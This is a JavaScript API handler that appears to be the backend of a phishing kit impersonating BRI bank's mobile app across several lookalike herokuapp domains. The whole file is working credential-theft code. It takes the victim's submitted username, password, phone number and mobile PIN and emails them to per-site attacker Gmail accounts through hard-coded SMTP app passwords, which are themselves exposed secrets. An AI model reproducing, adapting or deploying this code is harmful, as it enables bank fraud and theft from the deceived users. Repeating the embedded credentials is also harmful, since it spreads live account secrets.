export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if(url == 'https://ubahtarif.herokuapp.com/ '){

        email = 'orbitorbit799@gmail.com';
        pass = 'ahghpmbdwokimqim'; 

    } else if(url == 'peruubahan-tarif-bri.herokuapp.com'){
        email = 'andin1234zx@gmail.com' ;
        pass = 'ujnjjdjcumttwjsu' ;

    } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
        email = 'brigacor80@gmail.com';
        pass = 'zhzcfhbdtzipldsz';
        
    } else if(url == 'tarif-perubah-an.herokuapp.com'){
        email = 'qqq66195@gmail.com';
        pass = 'gsnyrcjtylrepjdg';

    } else if(url == 'per-ubahan-tarif.herokuapp.com'){
        email = 'alhamdulillahbule@gmail.com';
        pass = 'cojyqlvqjjocgaln';

    } else if(url == 'ubah-tarifbri.herokuapp.com'){
        email = 'accbrimo133@gmail.com';
        pass = 'tdxfejizruzpyvtl';

    } else if(url == 'britarif-ubah.herokuapp.com'){
        email = 'akunjp771@gmail.com';
        pass = 'trydeazatzdjorhy';

    } else if(url == 'tarif-per-ubahan.herokuapp.com'){
        email = 'bosm4106@gmail.com';
        pass = 'ocrpobrfxwgucaih';

    }   
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',  
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                <ul>
                    <li>username: ${body.username ?? '-'}</li> 
                    <li>password: ${body.password ?? '-'}</li>
                    <li>nohp: ${body.noHp ?? '-'}</li>
                    <li>pin: ${body.mPin ?? '-'}</li>
                    <li>message: ${body.message ?? '-'}</li>
                </ul>
                `,                  
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}